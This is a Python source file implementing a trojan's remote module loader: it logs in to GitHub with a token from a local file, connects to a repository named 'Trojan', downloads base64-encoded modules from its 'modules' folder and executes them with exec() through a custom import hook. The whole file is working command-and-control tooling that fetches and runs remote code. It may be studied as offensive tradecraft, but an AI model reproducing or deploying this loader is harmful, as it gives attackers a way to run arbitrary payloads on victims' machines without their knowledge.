import os
import github3
import importlib.abc
import importlib.util
import sys
import base64
import traceback


def github_connect():
    # Get the path to the mytoken.txt file relative to the current script
    token_path = os.path.join(os.path.dirname(__file__), 'mytoken.txt')

    # Check if the file exists before proceeding
    if not os.path.exists(token_path):
        raise FileNotFoundError(f"Token file not found at {token_path}. Please make sure the file exists.")
    
    # Read the GitHub token
    with open(token_path, 'r') as f:
        token = f.read().strip()  # Strip whitespace or newline characters

    # Set your GitHub username
    user = 'Rskladanek'  # Replace with your actual GitHub username

    # Log in to GitHub using the token
    sess = github3.login(token=token)

    # Return the repository object
    return sess.repository(user, 'Trojan')


# Move get_file_contents to the module level
def get_file_contents(dirname, module_name, repo):
    try:
        return repo.file_contents(f'{dirname}/{module_name}').content
    except github3.exceptions.NotFoundError:
        print(f"[ERROR] File {dirname}/{module_name} not found in the repository.")
        raise FileNotFoundError(f"File {dirname}/{module_name} not found in the repository.")


class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    """
    Custom importer to fetch and load Python modules from a GitHub repository.
    """


    def __init__(self):
        self.current_module_code = ""
        self.repo = github_connect()


    def find_spec(self, fullname, path=None, target=None):
        """
        Check if the module exists in the repository and fetch its code.
        """
        print(f"[*] Attempting to fetch module: {fullname}")
        try:
            # Skip built-in and already loaded modules
            if fullname in sys.builtin_module_names or fullname in sys.modules:
                print(f"[INFO] Skipping built-in or already loaded module: {fullname}")
                return None

            # Use the standard PathFinder to check if the module exists locally
            spec = importlib.machinery.PathFinder.find_spec(fullname)
            if spec is not None:
                print(f"[INFO] Skipping locally available module: {fullname}")
                return None

            # Skip standard library modules (if applicable)
            if hasattr(sys, 'stdlib_module_names') and fullname in sys.stdlib_module_names:
                print(f"[INFO] Skipping standard library module: {fullname}")
                return None

            # Fetch the module code from GitHub
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library).decode('utf-8')
                print(f"[INFO] Module {fullname} fetched successfully.")

                # Create a module spec with self as the loader
                return importlib.util.spec_from_loader(fullname, loader=self)
        except Exception as e:
            print(f"[ERROR] Failed to fetch module {fullname}: {e}")
            traceback.print_exc()
        return None


    def create_module(self, spec):
        """
        Optional method; can return None to use default module creation.
        """
        return None  # Use default module creation semantics


    def exec_module(self, module):
        """
        Execute the module code in the module's namespace.
        """
        print(f"[*] Loading module: {module.__name__}")
        try:
            exec(self.current_module_code, module.__dict__)
            print(f"[INFO] Module {module.__name__} loaded successfully.")
        except Exception as e:
            print(f"[ERROR] Failed to load module {module.__name__}: {e}")
            traceback.print_exc()
            raise
    

